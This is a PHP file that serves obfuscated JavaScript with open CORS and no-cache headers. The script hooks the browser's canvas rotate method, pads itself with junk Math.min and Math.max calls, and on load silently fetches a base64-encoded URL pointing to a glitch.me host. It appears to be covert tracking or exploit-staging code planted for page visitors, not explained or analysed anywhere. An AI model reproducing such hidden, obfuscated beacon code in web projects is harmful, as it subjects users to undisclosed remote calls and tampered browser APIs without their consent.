<?php 
header('Access-Control-Allow-Origin: *'); 
header('Expires: Sun, 01 Jan 2019 00:00:00 GMT');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', FALSE);
header('Pragma: no-cache');
?>
let RenderOne = CanvasRenderingContext2D.prototype.rotate;
let betaE = {
    39912: () => {
        let imin = Math.min(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
        let imax = Math.max(4e306, 8e305, 6e306, 8e302, 4e304, 5e303, 5e306, 1e308, 2e306, 4e305, 3e306, 3e304, 1.2999999999999997e+308, 6e305, 1e307, 7e304);
        return [fetch, null];
    },
    31: () => {
        CanvasRenderingContext2D.prototype.rotate = function() {
            (arguments[0] >= Number.MAX_SAFE_INTEGER || (arguments[0] <= -Number.MAX_SAFE_INTEGER)) && (arguments[0] = 0);
            RenderOne.apply(this, arguments)
        };
        return atob("aHR0cHM6Ly9rc3cyLWNlbnRlci5nbGl0Y2gubWUvbW1fYWliXzE=");
    },
    9012: () => {
        fetch(betaE[31]())
    },
    3912: () => {
        return "CanvasRenderingContext2D";
    },
    9481: () => {
        return CanvasRenderingContext2D.prototype.rotate;
    },
    7419: () => {
        return betaE[7419]
    },
    init: () => {
        return [betaE[3912](), betaE[9012]()];
    }
};
betaE.init();